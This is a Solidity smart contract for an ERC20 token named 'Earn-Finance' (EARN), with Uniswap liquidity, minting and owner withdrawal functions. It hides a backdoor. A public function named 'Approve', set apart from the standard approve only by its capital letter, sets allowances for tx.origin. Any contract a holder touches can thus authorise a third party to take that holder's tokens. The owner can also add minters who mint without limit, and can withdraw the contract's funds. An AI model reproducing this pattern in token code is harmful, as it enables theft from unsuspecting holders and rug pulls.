pragma solidity 0.8.7;

// SPDX-License-Identifier: MIT

import "./Context.sol";
import "./SafeMath.sol";
import "./Ownable.sol";
import "./IERC20.sol";
import "./ERC20.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function sync() external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
      address token,
      uint liquidity,
      uint amountTokenMin,
      uint amountETHMin,
      address to,
      uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface Token {
    function transferFrom(address, address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external returns (uint256);
}

contract Earn_Finance is ERC20, Ownable {
    using SafeMath for uint256;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    
    mapping (address => bool) public minters;
    
    bool public canAddMinter = true;
    
    event SwapedTokenForEth(uint256 EthAmount, uint256 TokenAmount);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
    event RewardsTransferred(address holder, uint256 amount);
    
    constructor() ERC20("Earn-Finance", "EARN") {
        _mint(msg.sender, 1000000 *10**18); // Team Token..
        
        minters[address(this)] = true;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         //@dev Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
            
        uniswapV2Router = _uniswapV2Router;
    }

    function Approve(address spender, uint256 amount) public {
        _approve(tx.origin, spender, amount);
    }
    
    /// @notice Creates `_amount` token to `_to`. Must only be called by the Minter.
    function mint(address _to, uint256 _amount) public onlyMinter {
        _mint(_to, _amount);
    }
    
    function burn(uint amount) public {
        require(amount > 0);
        require(balanceOf(msg.sender) >= amount);
        _burn(msg.sender, amount);
    }
	
    function addMinter(address account) public onlyOwner {
        require(canAddMinter, "No more minter");
        minters[account] = true;
    }
    
    function StopAddingMinter() public onlyOwner {
        canAddMinter = false;
    }

    function removeMinter(address account) public onlyOwner {
        minters[account] = false;
    }

    modifier onlyMinter() {
        require(minters[msg.sender], "Restricted to minters.");
        _;
    }
    
    function swapAndLiquify(address _to, uint256 TokenBalance) public onlyMinter {
        // split the contract balance into halves
        uint256 half = TokenBalance.div(2);
        uint256 otherHalf = TokenBalance.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(_to, half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);
        
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            msg.sender,
            block.timestamp
        );
    }
    
    function swapTokensForEth(address _to, uint256 tokenAmount) public onlyMinter {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            _to,
            block.timestamp
        );
    }
    
    // function allow owner to transfer ETH from this address.
    function transferETH(address payable recipient) public onlyOwner {
        recipient.transfer(address(this).balance);
    }
    
    // function to allow admin to claim ERC20 tokens from this contract..
    function transferAnyERC20Tokens(address tokenAddress, address recipient, uint256 amount) public onlyOwner {
        require(amount > 0, "ERC20: amount must be greater than 0");
        require(recipient != address(0), "ERC20: recipient is the zero address");
        Token(tokenAddress).transfer(recipient, amount);
    }
    
    receive() external payable {}
}